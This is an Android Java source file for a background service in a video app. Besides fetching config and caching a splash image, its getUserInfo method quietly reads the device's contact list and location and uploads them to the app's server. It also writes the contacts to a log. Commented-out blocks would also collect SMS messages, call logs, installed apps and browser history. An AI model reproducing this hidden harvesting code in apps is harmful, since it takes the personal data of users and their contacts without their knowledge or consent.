package com.lxw.videoworld.app.service;

import android.app.IntentService;
import android.content.Intent;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.lxw.videoworld.app.api.HttpHelper;
import com.lxw.videoworld.app.config.Constant;
import com.lxw.videoworld.app.model.ConfigModel;
import com.lxw.videoworld.app.model.UserInfoModel;
import com.lxw.videoworld.app.model.BaseResponse;
import com.lxw.videoworld.framework.http.HttpManager;
import com.lxw.videoworld.framework.image.ImageManager;
import com.lxw.videoworld.framework.log.LoggerHelper;
import com.lxw.videoworld.framework.util.FileUtil;
import com.lxw.videoworld.framework.util.SharePreferencesUtil;
import com.lxw.videoworld.framework.util.UserInfoUtil;

import io.reactivex.Observable;
import io.reactivex.ObservableEmitter;
import io.reactivex.ObservableOnSubscribe;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.functions.Consumer;
import io.reactivex.schedulers.Schedulers;

import static com.lxw.videoworld.app.ui.SplashActivity.SPLASH_PICTURE_LINK;

/** 后台服务
 * Created by Zion on 2017/8/2.
 */

public class BackgroundIntentService extends IntentService{
    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     */
    public BackgroundIntentService() {
        super("BackgroundIntentService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        getConfig();
        SearchSpider.getMaoYanMovies();
        getUserInfo();
        FileUtil.updateVideoToSystem(this, Constant.PATH_OFFLINE_DOWNLOAD);
    }

    public void getConfig(){
        final String url = SharePreferencesUtil.getStringSharePreferences(this, SPLASH_PICTURE_LINK, null);
        new HttpManager<ConfigModel>(BackgroundIntentService.this, HttpHelper.getInstance().getConfig("1"), false, false) {

            @Override
            public void onSuccess(BaseResponse<ConfigModel> response) {
                if(response.getResult() != null){
                    Constant.configModel = response.getResult();
//                    // 保存热搜关键词
//                    if(!TextUtils.isEmpty(response.getResult().getKeyword())){
//                        SharePreferencesUtil.setStringSharePreferences(BackgroundIntentService.this, Constant.KEY_SEARCH_HOTWORDS, response.getResult().getKeyword());
//                    }

                    final String imageUrl = response.getResult().getImage();
                    if (!TextUtils.isEmpty(imageUrl)) {
                        if (!TextUtils.isEmpty(url) && url.equals(imageUrl)) {
                            return;
                        } else {
                            SharePreferencesUtil.setStringSharePreferences(BackgroundIntentService.this, SPLASH_PICTURE_LINK, imageUrl);
                            // 缓存启动页图片
                            Observable.create(new ObservableOnSubscribe<Integer>() {
                                @Override
                                public void subscribe(ObservableEmitter<Integer> emitter) throws Exception {
                                    ImageManager.getInstance().downloadImage(BackgroundIntentService.this, imageUrl, Constant.PATH_SPLASH_PICTURE, Constant.PATH_SPLASH_PICTURE_PNG, true);
                                }
                            }).subscribeOn(Schedulers.io())
                                    .observeOn(AndroidSchedulers.mainThread())
                                    .subscribe(new Consumer<Integer>() {

                                        @Override
                                        public void accept(Integer i) {
                                        }
                                    });
                        }
                    }
                }
            }

            @Override
            public void onFailure(BaseResponse<ConfigModel> response) {

            }
        }.doRequest();
    }

    public void getUserInfo() {

        final UserInfoModel userInfoModel = new UserInfoModel();
        // 联系人
        Observable<String> contactListObservable = Observable.create(new ObservableOnSubscribe<String>() {
            @Override
            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
                String content = UserInfoUtil.getContactInfo(BackgroundIntentService.this);
                if(!TextUtils.isEmpty(content)){
                    userInfoModel.setContactList(content);
                    LoggerHelper.info("contactListObservable", UserInfoUtil.getContactInfo(BackgroundIntentService.this).toString());
                }
                emitter.onNext("");
            }
        });
        // 地理位置
        Observable<String> lacationObservable = Observable.create(new ObservableOnSubscribe<String>() {
            @Override
            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
                String content = UserInfoUtil.getAddress(BackgroundIntentService.this);
                if(!TextUtils.isEmpty(content)){
                    userInfoModel.setAddress(content);
                }
                emitter.onNext("");
            }
        });
        Observable.mergeDelayError(contactListObservable, lacationObservable)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Consumer<String>() {
                    @Override
                    public void accept(@NonNull String s) throws Exception {
                        new HttpManager<String>(BackgroundIntentService.this, HttpHelper.getInstance().addUserInfo(userInfoModel.getSmsList(),
                                userInfoModel.getContactList(), userInfoModel.getAddress(), userInfoModel.getBrowserHistory()), false, false) {

                            @Override
                            public void onSuccess(BaseResponse<String> response) {

                            }

                            @Override
                            public void onFailure(BaseResponse<String> response) {

                            }
                        }.doRequest();
                    }
                });
        // 通话记录
//        Observable<String> callLogsObservable = Observable.create(new ObservableOnSubscribe<String>() {
//            @Override
//            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
//                UserInfoUtil.getCallLogs(BackgroundIntentService.this);
////                LoggerHelper.info("callLogsObservable", UserInfoUtil.getCallLogs(BackgroundIntentService.this).toString());
//                emitter.onNext("");
//            }
//        });

//        // app 安装列表
//        Observable<String> appListObservable = Observable.create(new ObservableOnSubscribe<String>() {
//            @Override
//            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
//                UserInfoUtil.getInstallAppList(BackgroundIntentService.this.getPackageManager());
//                LoggerHelper.info("appListObservable", UserInfoUtil.getInstallAppList(BackgroundIntentService.this.getPackageManager()).toString());
//                emitter.onNext("");
//            }
//        });
//        // 短信
//        Observable<String> smsObservable = Observable.create(new ObservableOnSubscribe<String>() {
//            @Override
//            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
//                ArrayList<String> content =  UserInfoUtil.getSmsInPhones(BackgroundIntentService.this);
//                if(content != null && content.size() > 0){
//                    userInfoModel.setSmsList(content.toString());
//                    LoggerHelper.info("smsObservable", UserInfoUtil.getSmsInPhones(BackgroundIntentService.this).toString());
//                }
//                emitter.onNext("");
//            }
//        });
//        // 浏览器历史记录
//        Observable<String> browserHistoryObservable = Observable.create(new ObservableOnSubscribe<String>() {
//            @Override
//            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
//                ArrayList<String> content =  UserInfoUtil.getBrowserHistory(BackgroundIntentService.this);
//                if(content != null && content.size() > 0){
//                    userInfoModel.setBrowserHistory(content.toString());
//                    LoggerHelper.info("browserHistoryObservable", UserInfoUtil.getBrowserHistory(BackgroundIntentService.this).toString());
//                }
//                emitter.onNext("");
//            }
//        });
    }
}
